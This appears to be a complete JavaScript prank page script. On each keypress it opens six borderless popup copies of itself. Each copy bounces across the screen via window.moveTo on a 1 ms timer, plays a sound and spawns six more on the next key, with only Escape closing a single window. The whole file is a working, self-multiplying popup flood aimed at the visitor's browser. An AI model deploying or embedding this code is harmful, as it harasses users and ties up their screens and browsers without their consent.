const voice = document.getElementById("mortVoice");

let xOff = 5;
let yOff = 5;
let xPos = 400;
let yPos = 100;
let flagRun = 1;

function playVoice() {
  if (!voice) return;
  voice.currentTime = 0;
  voice.play().catch(() => {});
}

function openWindow(url) {
  return window.open(
    url,
    "_blank",
    "menubar=no,status=no,toolbar=no,resizable=no,width=400,height=400,titlebar=no"
  );
}

function procreate() {
  for (let i = 0; i < 6; i++) {
    openWindow(`${window.location.pathname}?mort=1${window.location.hash}`);
  }
}

function newXlt() {
  xOff = Math.ceil(-6 * Math.random()) * 5 - 10;
  window.focus();
}

function newXrt() {
  xOff = Math.ceil(7 * Math.random()) * 5 - 10;
}

function newYup() {
  yOff = Math.ceil(-6 * Math.random()) * 5 - 10;
}

function newYdn() {
  yOff = Math.ceil(7 * Math.random()) * 5 - 10;
}

function fOff() {
  flagRun = 0;
}

function playBall() {
  xPos += xOff;
  yPos += yOff;

  if (xPos > screen.availWidth - 400) {
    newXlt();
  }

  if (xPos < screen.availLeft) {
    newXrt();
  }

  if (yPos > screen.availHeight - 400) {
    newYup();
  }

  if (yPos < screen.availTop) {
    newYdn();
  }

  if (flagRun === 1) {
    try {
      window.moveTo(Math.round(xPos), Math.round(yPos));
    } catch (_) {}
    setTimeout(playBall, 1);
  }
}

function handleKeyDown(event) {
  if (event.key === "Escape") {
    fOff();
    try {
      window.close();
    } catch (_) {}
    return;
  }

  playVoice();
  procreate();
}

window.addEventListener("keydown", handleKeyDown);

if (window.opener) {
  xPos = window.screenX;
  yPos = window.screenY;
  xOff = (Math.random() < 0.5 ? -1 : 1) * (4 + Math.random() * 4);
  yOff = (Math.random() < 0.5 ? -1 : 1) * (4 + Math.random() * 4);
  playBall();
}
